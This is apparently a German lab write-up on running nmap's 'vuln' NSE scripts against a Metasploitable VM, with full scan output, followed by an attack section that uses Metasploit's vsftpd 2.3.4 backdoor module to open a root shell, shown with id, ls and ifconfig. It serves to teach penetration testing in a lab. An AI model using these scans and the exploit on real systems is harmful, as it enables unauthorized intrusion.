---
title: Vulnerability Scan mit nmap
---

[NSE Skripte Kategorie vuln](https://nmap.org/nsedoc/categories/vuln.html)

Diese Skripte sind "intusive" und werden nicht über die Optionen `-sC` oder `-A` aufgerufen.

Ausführen aller Skripte in der Kategorie "vuln":

```bash
# Scan von metasploitable
$ nsmap --script vuln 192.168.178.71 

Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-06 06:34 EDT
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Stats: 0:04:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.81% done; ETC: 06:38 (0:00:00 remaining)
Stats: 0:04:11 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.81% done; ETC: 06:38 (0:00:00 remaining)
Stats: 0:04:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.81% done; ETC: 06:39 (0:00:00 remaining)
Stats: 0:04:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.81% done; ETC: 06:39 (0:00:00 remaining)
Nmap scan report for 192.168.178.71
Host is up (0.00027s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       https://www.securityfocus.com/bid/48539
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
|_sslv2-drown: 
22/tcp   open  ssh
23/tcp   open  telnet
25/tcp   open  smtp
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: postfix builtin
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2015-4000  BID:74733
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://weakdh.org
|       https://www.securityfocus.com/bid/74733
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_DES_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: postfix builtin
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.securityfocus.com/bid/70574
|_      https://www.imperialviolet.org/2014/10/14/poodle.html
|_sslv2-drown: ERROR: Script execution failed (use -d to debug)
53/tcp   open  domain
80/tcp   open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.178.71
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://192.168.178.71:80/dvwa/
|     Form id: 
|     Form action: login.php
|     
|     Path: http://192.168.178.71:80/twiki/TWikiDocumentation.html
|     Form id: 
|     Form action: http://TWiki.org/cgi-bin/passwd/TWiki/WebHome
|     
|     Path: http://192.168.178.71:80/twiki/TWikiDocumentation.html
|     Form id: 
|     Form action: http://TWiki.org/cgi-bin/passwd/Main/WebHome
|     
|     Path: http://192.168.178.71:80/twiki/TWikiDocumentation.html
|     Form id: 
|     Form action: http://TWiki.org/cgi-bin/edit/TWiki/
|     
|     Path: http://192.168.178.71:80/twiki/TWikiDocumentation.html
|     Form id: 
|     Form action: http://TWiki.org/cgi-bin/view/TWiki/TWikiSkins
|     
|     Path: http://192.168.178.71:80/twiki/TWikiDocumentation.html
|     Form id: 
|_    Form action: http://TWiki.org/cgi-bin/manage/TWiki/ManagingWebs
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /tikiwiki/: Tikiwiki
|   /test/: Test page
|   /phpinfo.php: Possible information file
|   /phpMyAdmin/: phpMyAdmin
|   /doc/: Potentially interesting directory w/ listing on 'apache/2.2.8 (ubuntu) dav/2'
|   /icons/: Potentially interesting folder w/ directory listing
|_  /index/: Potentially interesting folder
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       http://ha.ckers.org/slowloris/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
| http-sql-injection: 
|   Possible sqli for queries:
|     http://192.168.178.71:80/dav/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=capture-data.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?do=toggle-hints%27%20OR%20sqlspider&page=home.php
|     http://192.168.178.71:80/mutillidae/index.php?page=user-info.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=home.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=captured-data.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=framing.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=usage-instructions.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=arbitrary-file-inclusion.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/?page=view-someones-blog.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=dns-lookup.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=secret-administrative-pages.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=set-background-color.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=php-errors.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/?page=credits.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/?page=text-file-viewer.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=view-someones-blog.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=installation.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/?page=user-info.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=documentation%2fvulnerabilities.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/?page=source-viewer.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=source-viewer.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=site-footer-xss-discussion.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=documentation%2fhow-to-access-Mutillidae-over-Virtual-Box-network.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=add-to-your-blog.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/?page=login.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?do=toggle-security%27%20OR%20sqlspider&page=home.php
|     http://192.168.178.71:80/mutillidae/?page=show-log.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=browser-info.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=show-log.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=login.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=notes.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/?page=add-to-your-blog.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=credits.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=text-file-viewer.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=pen-test-tool-lookup.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?username=anonymous&page=password-generator.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=user-poll.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=register.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=change-log.htm%27%20OR%20sqlspider
|     http://192.168.178.71:80/mutillidae/index.php?page=html5-storage.php%27%20OR%20sqlspider
|     http://192.168.178.71:80/view/TWiki/TWikiHistory?rev=1.8%27%20OR%20sqlspider
|     http://192.168.178.71:80/view/TWiki/TWikiHistory?rev=1.7%27%20OR%20sqlspider
|     http://192.168.178.71:80/oops/TWiki/TWikiHistory?param1=1.10%27%20OR%20sqlspider&template=oopsrev
|     http://192.168.178.71:80/oops/TWiki/TWikiHistory?param1=1.10&template=oopsrev%27%20OR%20sqlspider
|     http://192.168.178.71:80/view/TWiki/TWikiHistory?rev=1.9%27%20OR%20sqlspider
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.7%27%20OR%20sqlspider&rev1=1.8
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.7&rev1=1.8%27%20OR%20sqlspider
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.8%27%20OR%20sqlspider&rev1=1.9
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.8&rev1=1.9%27%20OR%20sqlspider
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.9%27%20OR%20sqlspider&rev1=1.10
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.9&rev1=1.10%27%20OR%20sqlspider
|     http://192.168.178.71:80/view/TWiki/TWikiHistory?rev=1.8%27%20OR%20sqlspider
|     http://192.168.178.71:80/view/TWiki/TWikiHistory?rev=1.7%27%20OR%20sqlspider
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.8%27%20OR%20sqlspider&rev1=1.9
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.8&rev1=1.9%27%20OR%20sqlspider
|     http://192.168.178.71:80/oops/TWiki/TWikiHistory?param1=1.10%27%20OR%20sqlspider&template=oopsrev
|     http://192.168.178.71:80/oops/TWiki/TWikiHistory?param1=1.10&template=oopsrev%27%20OR%20sqlspider
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.9%27%20OR%20sqlspider&rev1=1.10
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.9&rev1=1.10%27%20OR%20sqlspider
|     http://192.168.178.71:80/view/TWiki/TWikiHistory?rev=1.9%27%20OR%20sqlspider
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.7%27%20OR%20sqlspider&rev1=1.8
|     http://192.168.178.71:80/rdiff/TWiki/TWikiHistory?rev2=1.7&rev1=1.8%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=M%3bO%3dD%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://192.168.178.71:80/dav/?C=S%3bO%3dD%27%20OR%20sqlspider
|_    http://192.168.178.71:80/dav/?C=D%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-trace: TRACE is enabled
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
111/tcp  open  rpcbind
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
512/tcp  open  exec
513/tcp  open  login
514/tcp  open  shell
1099/tcp open  rmiregistry
| rmi-vuln-classloader: 
|   VULNERABLE:
|   RMI registry default configuration remote code execution vulnerability
|     State: VULNERABLE
|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.
|       
|     References:
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/java_rmi_server.rb
1524/tcp open  ingreslock
2049/tcp open  nfs
2121/tcp open  ccproxy-ftp
3306/tcp open  mysql
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
5432/tcp open  postgresql
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
|       http://www.cvedetails.com/cve/2014-0224
|_      http://www.openssl.org/news/secadv_20140605.txt
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  CVE:CVE-2014-3566  BID:70574
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
|       https://www.securityfocus.com/bid/70574
|_      https://www.imperialviolet.org/2014/10/14/poodle.html
|_sslv2-drown: 
5900/tcp open  vnc
|_sslv2-drown: 
6000/tcp open  X11
6667/tcp open  irc
|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277
8009/tcp open  ajp13
8180/tcp open  unknown
| http-cookie-flags: 
|   /admin/: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/index.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/login.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/admin.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/account.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/admin_login.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/home.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/admin-login.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/adminLogin.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/controlpanel.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/cp.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/index.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/login.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/admin.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/home.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/controlpanel.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/admin-login.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/cp.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/account.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/admin_login.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/adminLogin.jsp: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: 
|     JSESSIONID: 
|       httponly flag not set
|   /admin/jscript/upload.html: 
|     JSESSIONID: 
|_      httponly flag not set
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /admin/login.html: Possible admin folder
|   /admin/admin.html: Possible admin folder
|   /admin/account.html: Possible admin folder
|   /admin/admin_login.html: Possible admin folder
|   /admin/home.html: Possible admin folder
|   /admin/admin-login.html: Possible admin folder
|   /admin/adminLogin.html: Possible admin folder
|   /admin/controlpanel.html: Possible admin folder
|   /admin/cp.html: Possible admin folder
|   /admin/index.jsp: Possible admin folder
|   /admin/login.jsp: Possible admin folder
|   /admin/admin.jsp: Possible admin folder
|   /admin/home.jsp: Possible admin folder
|   /admin/controlpanel.jsp: Possible admin folder
|   /admin/admin-login.jsp: Possible admin folder
|   /admin/cp.jsp: Possible admin folder
|   /admin/account.jsp: Possible admin folder
|   /admin/admin_login.jsp: Possible admin folder
|   /admin/adminLogin.jsp: Possible admin folder
|   /manager/html/upload: Apache Tomcat (401 Unauthorized)
|   /manager/html: Apache Tomcat (401 Unauthorized)
|   /admin/view/javascript/fckeditor/editor/filemanager/connectors/test.html: OpenCart/FCKeditor File upload
|   /admin/includes/FCKeditor/editor/filemanager/upload/test.html: ASP Simple Blog / FCKeditor File Upload
|   /admin/jscript/upload.html: Lizard Cart/Remote File upload
|_  /webdav/: Potentially interesting folder
MAC Address: 08:00:27:04:0A:09 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: false
|_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 348.12 seconds
```

Skripte werden nur dann ausgeführt wenn gewisse Rules erfüllt sind. Z.B ein bestimmter Dienst gefunden, bzw. auch eine besondere Version davon.



## Angriff

```
21/tcp   open  ftp
| ftp-vsftpd-backdoor: 
|   VULNERABLE:
|   vsFTPd version 2.3.4 backdoor
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2011-2523  BID:48539
|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
|     Disclosure date: 2011-07-03
|     Exploit results:
|       Shell command: id
|       Results: uid=0(root) gid=0(root)
|     References:
|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
|       https://www.securityfocus.com/bid/48539
|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
```

msf

```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor 
[*] No payload configured, defaulting to cmd/unix/interact

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the 
  VSFTPD download archive. This backdoor was introduced into the 
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
  according to the most recent information available. This backdoor 
  was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html

```



```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.178.71:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.178.71:21 - USER: 331 Please specify the password.
[+] 192.168.178.71:21 - Backdoor service has been spawned, handling...
[+] 192.168.178.71:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.178.71:6200) at 2021-05-06 07:00:04 -0400

_
```

Es läuft nun eine shell auf dem Zielsystem (root shell!).

```
id
uid=0(root) gid=0(root)
```

```
pwd
/
```

```
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
```

```
ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 08:00:27:04:0a:09  
          inet addr:192.168.178.71  Bcast:192.168.178.255  Mask:255.255.255.0
          inet6 addr: 2001:871:235:acdb:a00:27ff:fe04:a09/64 Scope:Global
          inet6 addr: fe80::a00:27ff:fe04:a09/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:49801 errors:0 dropped:0 overruns:0 frame:0
          TX packets:34306 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:4999687 (4.7 MB)  TX bytes:16507931 (15.7 MB)
          Base address:0xd020 Memory:f0200000-f0220000
```

`ifconfig` bestätigt dass es sich bei dem System um Metasploitable handelt (`192.168.178.71`). 

Abbruch mit Strg-C.

